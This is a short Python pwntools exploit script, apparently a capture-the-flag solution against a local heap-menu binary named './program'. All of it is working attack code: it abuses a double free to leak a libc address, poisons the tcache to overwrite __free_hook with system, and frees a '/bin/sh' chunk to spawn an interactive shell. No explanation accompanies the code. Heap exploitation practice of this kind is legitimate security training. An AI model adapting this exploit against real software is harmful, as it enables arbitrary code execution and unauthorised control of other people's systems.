#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
libc = ELF("libc.so.6")
gdb.attach(p,"init-pwndbg")

def malloc(idx,size,data):
    p.sendlineafter(">> ","1")
    p.recvline()
    p.sendline(str(idx))
    p.recvline()
    p.sendline(str(size))
    p.recvline()
    p.send(data)

def free(idx):
    p.sendlineafter(">> ","3")
    p.recvline()
    p.sendline(str(idx))

def view(idx):
    p.sendlineafter(">> ","4")
    p.recvline()
    p.sendline(str(idx))
    p.recvuntil("Your data :")
    leak = p.recvline()[:-1]
    return leak

def edit(idx,data):
    p.sendlineafter(">> ","2")
    p.recvline()
    p.sendline(str(idx))
    p.recvline()
    p.send(data)

malloc(0,0x88,'a'*8)
malloc(1,0x88,'b'*8)
malloc(2,0x18,'c'*8)
free(0)
for i in range(7):
    edit(0,'a'*16)
    free(0)
free(1)
leak = view(0)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x3ebca0
log.critical(f"Libc base address: {hex(libc.address)}")
__free_hook = libc.sym.__free_hook
system = libc.sym.system
malloc(3,0x48,b'0'*8)
free(3)
edit(3,p64(__free_hook))
malloc(4,0x48,b'/bin/sh\x00')
malloc(5,0x48,p64(system))
free(4)
p.interactive()
